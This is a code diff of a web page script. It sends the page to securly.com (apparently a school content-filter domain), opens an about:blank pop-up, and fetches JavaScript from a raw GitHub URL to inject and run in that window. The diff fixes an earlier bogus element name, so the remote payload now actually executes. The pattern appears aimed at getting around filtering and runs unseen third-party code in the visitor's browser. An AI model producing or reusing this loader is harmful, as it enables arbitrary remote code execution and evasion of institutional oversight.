@@ -10,27 +10,29 @@
             const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
-            // Open a new about:blank window
+            // Redirect to the new URL
+            window.location.href = redirectUrl;
+
+            // Open an about:blank window
             const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
 
-            // Redirect to the new URL and track it
-            newWindow.location.href = redirectUrl;
+            // Ensure the new window is ready before injecting the script
+            if (newWindow) {
+                newWindow.document.write('<!DOCTYPE html><html lang="en"><head><title>Script Execution</title></head><body></body></html>');
+                newWindow.document.close();
 
-            // Listen for the 'load' event after redirection
-            newWindow.addEventListener('load', () => {
-                setTimeout(() => {
-                    fetch(scriptUrl)
-                        .then(response => response.text())
-                        .then(scriptContent => {
-                            for (let i = 0; i < 3; i++) {
-                                const scriptElement = newWindow.document.createElement('script123456');
-                                scriptElement.textContent = scriptContent;
-                                newWindow.document.body.appendChild(scriptElement);
-                            }
-                        })
-                        .catch(error => console.error('Error loading script:', error));
-                }, 1000); // 1 second delay
-            });
+                // Fetch and execute the script in the new window
+                fetch(scriptUrl)
+                    .then(response => response.text())
+                    .then(scriptContent => {
+                        const scriptElement = newWindow.document.createElement('script');
+                        scriptElement.textContent = scriptContent;
+                        newWindow.document.body.appendChild(scriptElement);
+                    })
+                    .catch(error => console.error('Error loading script:', error));
+            } else {
+                console.error('Failed to open new window. Please allow pop-ups in your browser.');
+            }
         });
     </script>
 </head>
